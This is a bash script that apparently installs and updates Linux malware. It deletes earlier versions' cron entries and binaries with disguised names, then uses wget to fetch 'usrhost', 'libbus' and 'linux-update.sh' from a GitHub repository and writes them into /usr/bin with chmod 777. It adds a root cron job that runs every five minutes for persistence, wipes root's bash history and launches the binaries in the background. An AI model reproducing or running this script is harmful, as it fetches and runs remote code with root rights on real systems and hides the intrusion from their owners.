#!/bin/bash
#
#v1.0 uninstall
#
sed -i '/\* 12 \* \* \* root \/usr\/bin\/libhost.sh/d' /etc/crontab
sed -i '/\* 0 \* \* \* root \/usr\/bin\/bashd/d' /etc/crontab
sed -i '/\* 23 \* \* \* root \/usr\/bin\/soexec.sh/d' /etc/crontab
sed -i '/\* 8 \* \* \* root \/usr\/bin\/bashd.sh/d' /etc/crontab
sed -i '/\*\/5 \* \* \* \* root \/usr\/bin\/singal.sh/d' /etc/crontab

killall libhost
killall soexec
killall bashd

rm -rf /usr/bin/libhost.sh
rm -rf /usr/bin/soexec.sh
rm -rf /usr/bin/bashd.sh
rm -rf /usr/bin/singal.sh

rm -rf /usr/bin/libhost
rm -rf /usr/bin/soexec
rm -rf /usr/bin/bashd

rm -rf /usr/bin/libhost_ver.txt

sed -i '/\*\/5 \* \* \* \* root \/usr\/bin\/singal.sh >\/dev\/null 2>&1/d' /etc/crontab

#v2.0 uninstall

sed -i '/\*\/5 \* \* \* \* root \/usr\/bin\/linux-update.sh >\/dev\/null 2>&1/d' /etc/crontab

killall usrhost
killall libbus

rm -rf /usr/bin/linux-update.sh

rm -rf /usr/bin/usrhost
rm -rf /usr/bin/libbus

rm -rf /usr/bin/usrhost_ver.txt


wget https://raw.githubusercontent.com/myvulweb/b1/master/usrhost_ver.txt -O /usr/bin/usrhost_ver.txt

wget https://raw.githubusercontent.com/myvulweb/b1/master/linux-update.sh -O /usr/bin/linux-update.sh

chmod 777 /usr/bin/linux-update.sh


wget https://github.com/myvulweb/b1/raw/master/usrhost -O /usr/bin/usrhost 
chmod 777 /usr/bin/usrhost
wget https://github.com/myvulweb/b1/raw/master/libbus -O /usr/bin/libbus
chmod 777 /usr/bin/libbus

echo '*/5 * * * * root /usr/bin/linux-update.sh >/dev/null 2>&1'>>/etc/crontab

service crond restart

echo >/root/.bash_history
history -c
/usr/bin/usrhost &
/usr/bin/libbus &

 